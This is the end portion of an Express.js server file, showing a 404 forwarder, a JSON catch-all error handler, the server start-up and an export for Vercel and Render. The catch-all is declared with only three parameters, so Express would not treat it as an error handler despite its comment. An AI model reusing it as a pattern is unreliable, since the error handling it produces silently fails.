  next(createError(404));
});

// #3: Final catch-all — handles any error that slipped through the above handlers
app.use((err, req, res) => {
  const status = err.status || 500;
  const message = err.message || '500: Internal Server Error';
  res.status(status).json({ message: message });
});


// START SERVER
app.listen(PORT, () => {
  if (!process.env.VERCEL) {
    console.log(`Server is running on http://localhost:${PORT}`)
  }
})

// EXPORT FOR VERCEL AND RENDER
export default app
